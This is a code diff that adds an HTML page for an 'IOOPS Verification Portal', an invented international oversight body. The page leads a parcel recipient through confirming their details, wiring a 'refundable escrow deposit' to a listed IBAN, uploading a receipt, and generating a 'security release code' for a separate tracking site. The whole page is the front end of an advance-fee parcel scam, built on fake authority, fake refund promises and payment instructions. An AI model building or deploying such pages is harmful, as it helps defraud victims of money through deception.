@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IOOPS Verification Portal - Recipient Verification</title>
+    <link rel="stylesheet" href="css/recipient-verification.css">
+</head>
+<body>
+    <div class="verification-portal">
+        <!-- Header -->
+        <header class="portal-header">
+            <div class="header-content">
+                <div class="seal">⚖</div>
+                <div>
+                    <h1>IOOPS Verification Portal</h1>
+                    <p class="subtitle">International Oversight & Operations Protocol System</p>
+                </div>
+            </div>
+        </header>
+
+        <!-- Loading State -->
+        <div id="loading-state" class="loading-state">
+            <div class="loading-spinner"></div>
+            <p id="loading-message">Loading verification session...</p>
+        </div>
+
+        <!-- Error State -->
+        <div id="error-state" class="error-state" style="display: none;">
+            <div class="error-icon">⚠</div>
+            <h2>Verification Session Error</h2>
+            <p id="error-message"></p>
+        </div>
+
+        <!-- Main Content -->
+        <div id="main-content" class="main-content" style="display: none;">
+            <!-- Steps Progress Bar -->
+            <div class="steps-bar">
+                <div class="step" data-step="1">
+                    <div class="step-number">1</div>
+                    <div class="step-label">Info</div>
+                </div>
+                <div class="step" data-step="2">
+                    <div class="step-number">2</div>
+                    <div class="step-label">Payment</div>
+                </div>
+                <div class="step" data-step="3">
+                    <div class="step-number">3</div>
+                    <div class="step-label">Generate</div>
+                </div>
+                <div class="step" data-step="4">
+                    <div class="step-number">4</div>
+                    <div class="step-label">Complete</div>
+                </div>
+            </div>
+
+            <!-- Step 1: Recipient Information -->
+            <div id="step-1" class="verification-step">
+                <div class="step-content">
+                    <h2>Recipient Information Verification</h2>
+                    <p>Please verify your information below and confirm to proceed.</p>
+
+                    <div class="info-grid">
+                        <div class="info-item">
+                            <label>Full Name</label>
+                            <div class="info-value" id="recipient-name"></div>
+                        </div>
+                        <div class="info-item">
+                            <label>Email Address</label>
+                            <div class="info-value" id="recipient-email"></div>
+                        </div>
+                        <div class="info-item">
+                            <label>Tracking ID</label>
+                            <div class="info-value" id="tracking-id"></div>
+                        </div>
+                        <div class="info-item">
+                            <label>Shipment Origin</label>
+                            <div class="info-value" id="origin-country"></div>
+                        </div>
+                    </div>
+
+                    <div class="action-buttons">
+                        <button id="confirm-info-btn" class="btn-primary">Confirm & Continue</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Step 2: Escrow Payment -->
+            <div id="step-2" class="verification-step" style="display: none;">
+                <div class="step-content">
+                    <h2>Escrow Deposit Required</h2>
+
+                    <div class="info-notice">
+                        <p><strong>Why is this required?</strong> A refundable escrow deposit is required as part of the International Oversight Protocol to ensure shipment security and compliance.</p>
+                    </div>
+
+                    <div class="escrow-details">
+                        <div class="escrow-amount">
+                            <label>Required Deposit Amount</label>
+                            <div class="amount-display">
+                                <span class="currency">EUR</span>
+                                <span class="amount" id="escrow-amount"></span>
+                            </div>
+                        </div>
+
+                        <div class="payment-info-box">
+                            <h3>Payment Instructions</h3>
+                            <div class="payment-field">
+                                <label>Bank Name</label>
+                                <div class="value">Banque de France</div>
+                            </div>
+                            <div class="payment-field">
+                                <label>Account Holder</label>
+                                <div class="value">IOOPS Escrow Services</div>
+                            </div>
+                            <div class="payment-field">
+                                <label>IBAN</label>
+                                <div class="value copyable" id="payment-iban">
+                                    <span>FR76 3000 4025 1800 0100 0509 383</span>
+                                    <button class="btn-copy" onclick="copyToClipboard('FR76 3000 4025 1800 0100 0509 383')">Copy</button>
+                                </div>
+                            </div>
+                            <div class="payment-field">
+                                <label>SWIFT/BIC</label>
+                                <div class="value copyable">
+                                    <span>BNPAFRPP</span>
+                                    <button class="btn-copy" onclick="copyToClipboard('BNPAFRPP')">Copy</button>
+                                </div>
+                            </div>
+                            <div class="payment-field">
+                                <label>Reference Number</label>
+                                <div class="value copyable" id="payment-reference">
+                                    <span id="reference-number"></span>
+                                    <button class="btn-copy" onclick="copyToClipboard(document.getElementById('reference-number').textContent)">Copy</button>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="warning-box">
+                            <p><strong>Important:</strong> Include the reference number in your payment to ensure proper processing.</p>
+                        </div>
+                    </div>
+
+                    <!-- Payment Status Display -->
+                    <div id="payment-status-container" style="display: none;">
+                        <div id="payment-pending" class="status-box status-pending">
+                            <div class="status-icon">⏳</div>
+                            <div class="status-content">
+                                <h3>Payment Pending Approval</h3>
+                                <p>Your payment receipt has been uploaded and is being reviewed by our administrators.</p>
+                                <p class="status-time">Submitted: <span id="payment-submitted-time"></span></p>
+                            </div>
+                        </div>
+
+                        <div id="payment-rejected" class="status-box status-rejected" style="display: none;">
+                            <div class="status-icon">❌</div>
+                            <div class="status-content">
+                                <h3>Payment Receipt Rejected</h3>
+                                <p id="rejection-reason" class="rejection-reason"></p>
+                                <p><strong>Please upload a new receipt below.</strong></p>
+                            </div>
+                        </div>
+
+                        <div id="payment-approved" class="status-box status-approved" style="display: none;">
+                            <div class="status-icon">✓</div>
+                            <div class="status-content">
+                                <h3>Payment Verified</h3>
+                                <p>Your escrow deposit has been confirmed. Proceeding to next step...</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Upload Section -->
+                    <div id="upload-section" class="upload-section">
+                        <h3>Upload Payment Receipt</h3>
+                        <p>Once you've completed the payment, upload your receipt or confirmation screenshot.</p>
+
+                        <div class="upload-area" id="upload-area">
+                            <input type="file" id="receipt-input" accept="image/*,.pdf" style="display: none;">
+                            <div class="upload-prompt">
+                                <div class="upload-icon">📎</div>
+                                <p>Click to select or drag & drop your receipt</p>
+                                <p class="upload-hint">Supported: JPG, PNG, PDF (Max 5MB)</p>
+                            </div>
+                            <div class="upload-preview" id="upload-preview" style="display: none;">
+                                <img id="preview-image" src="" alt="Receipt preview">
+                                <div class="preview-info">
+                                    <p id="file-name"></p>
+                                    <button class="btn-remove" id="remove-file-btn">Remove</button>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button id="upload-receipt-btn" class="btn-primary" disabled>Upload Receipt</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Step 3: Generate Security Code -->
+            <div id="step-3" class="verification-step" style="display: none;">
+                <div class="step-content">
+                    <h2>Generate Security Release Code</h2>
+
+                    <div class="info-notice">
+                        <p><strong>✓ Payment Verified!</strong> Your escrow deposit has been confirmed.</p>
+                    </div>
+
+                    <p>Your shipment is currently on security hold pending authorization. To release your shipment for final delivery, you need to generate a unique security code.</p>
+
+                    <p><strong>What is a security code?</strong> This one-time authorization code will be used to verify your identity with the shipping carrier and release your shipment from the security hold.</p>
+
+                    <div id="generate-button-container">
+                        <button id="generate-code-btn" class="btn-generate">
+                            Generate My Security Code
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Step 4: Security Code & Completion -->
+            <div id="step-4" class="verification-step" style="display: none;">
+                <div class="step-content">
+                    <!-- WAITING STATE: Show while waiting for code verification -->
+                    <div id="step-4-waiting" class="step-4-state">
+                        <h2>Release Your Shipment Now</h2>
+
+                        <div class="success-banner">
+                            <div class="success-icon">✓</div>
+                            <p><strong>Security Code Generated Successfully!</strong></p>
+                        </div>
+
+                        <p><strong>Your unique authorization code is:</strong></p>
+
+                        <div class="code-box">
+                            <code id="security-code" class="security-code"></code>
+                            <div class="code-actions">
+                                <button id="copy-code-btn" class="btn-code-action">
+                                    <span class="btn-icon">📋</span> Copy
+                                </button>
+                                <button id="email-code-btn" class="btn-code-action">
+                                    <span class="btn-icon">📧</span> Email Me
+                                </button>
+                                <button id="download-code-btn" class="btn-code-action">
+                                    <span class="btn-icon">💾</span> Download
+                                </button>
+                            </div>
+                        </div>
+
+                        <div class="code-safety-notice">
+                            <h4>⚠️ IMPORTANT: Do Not Lose This Code</h4>
+                            <p>This is a <strong>one-time authorization code</strong> that cannot be regenerated. Save it using one of the methods above before proceeding.</p>
+                        </div>
+
+                        <div class="instructions-box">
+                            <h3>🚀 How to Release Your Shipment</h3>
+                            <ol class="instructions-list">
+                                <li><strong>Save your code</strong> using Copy, Email, or Download (above)</li>
+                                <li><strong>Visit</strong> the Meridian Tracking Portal → <a href="https://meridian-tracking.fly.dev" target="_blank" class="external-link">https://meridian-tracking.fly.dev</a></li>
+                                <li><strong>Enter</strong> your tracking ID: <code id="tracking-id-display"></code></li>
+                                <li><strong>Enter</strong> your security code to release your shipment</li>
+                                <li><strong>Wait</strong> for confirmation (this page will update automatically)</li>
+                            </ol>
+
+                            <div class="warning-box">
+                                <p><strong>⏱️ Time Sensitive:</strong> Once you enter this code on the Meridian portal, your shipment will be immediately cleared for final delivery.</p>
+                            </div>
+                        </div>
+
+                        <div class="polling-indicator">
+                            <div class="pulse-dot"></div>
+                            <span>Waiting for code verification on Meridian portal...</span>
+                        </div>
+                    </div>
+
+                    <!-- COMPLETED STATE: Show after code is verified -->
+                    <div id="step-4-completed" class="step-4-state" style="display: none;">
+                        <div class="completion-header">
+                            <div class="completion-icon">✓</div>
+                            <h2>Verification Complete</h2>
+                            <p class="completion-subtitle">Your shipment has been successfully released for delivery</p>
+                        </div>
+
+                        <div class="completion-info-box">
+                            <h3>Verification Summary</h3>
+                            <div class="info-row">
+                                <span class="info-label">Tracking ID:</span>
+                                <span class="info-value"><strong id="completion-tracking-id"></strong></span>
+                            </div>
+                            <div class="info-row">
+                                <span class="info-label">Verification Completed:</span>
+                                <span class="info-value" id="completion-date"></span>
+                            </div>
+                            <div class="info-row">
+                                <span class="info-label">Status:</span>
+                                <span class="info-value"><span class="status-badge status-complete">Cleared for Delivery</span></span>
+                            </div>
+                        </div>
+
+                        <div class="escrow-return-notice">
+                            <h3>💰 Escrow Deposit Return</h3>
+                            <p>Your escrow deposit of <strong>EUR €<span id="escrow-return-amount"></span></strong> will be returned within <strong><span id="escrow-return-days"></span> business days</strong> from the completion date above.</p>
+                            <p class="return-date">Expected return date: <strong id="escrow-return-date"></strong></p>
+                            <p class="return-info">The deposit will be returned to the account from which the payment originated. No action is required on your part.</p>
+                        </div>
+
+                        <div class="receipt-download-section">
+                            <h3>📄 Official Verification Receipt</h3>
+                            <p>Download your official IOOPS verification completion receipt for your records.</p>
+                            <button id="download-receipt-btn" class="btn-download-receipt">
+                                <span class="btn-icon">📄</span> Download PDF Receipt
+                            </button>
+                        </div>
+
+                        <div class="next-steps-complete">
+                            <h3>What Happens Next?</h3>
+                            <ol class="completion-steps-list">
+                                <li><strong>Your shipment is now cleared</strong> for final delivery to your address</li>
+                                <li><strong>You will receive tracking updates</strong> via email as your shipment progresses</li>
+                                <li><strong>The carrier will contact you</strong> to schedule delivery when your shipment arrives</li>
+                                <li><strong>Your escrow deposit</strong> will be automatically returned within <span id="escrow-return-days-2"></span> business days</li>
+                            </ol>
+                        </div>
+
+                        <div class="completion-footer">
+                            <p>Thank you for using the IOOPS Verification Portal. Your cooperation ensures the security and compliance of international shipments.</p>
+                            <p class="footer-note">You may close this page. A confirmation email has been sent to your registered email address.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <footer class="portal-footer">
+            <p>&copy; 2025 International Oversight & Operations Protocol System (IOOPS). All rights reserved.</p>
+            <p class="footer-links">
+                <a href="privacy-policy.html" target="_blank">Privacy Policy</a> |
+                <a href="terms-of-service.html" target="_blank">Terms of Service</a>
+            </p>
+        </footer>
+    </div>
+
+    <script src="js/recipient-verification.js"></script>
+</body>
+</html>
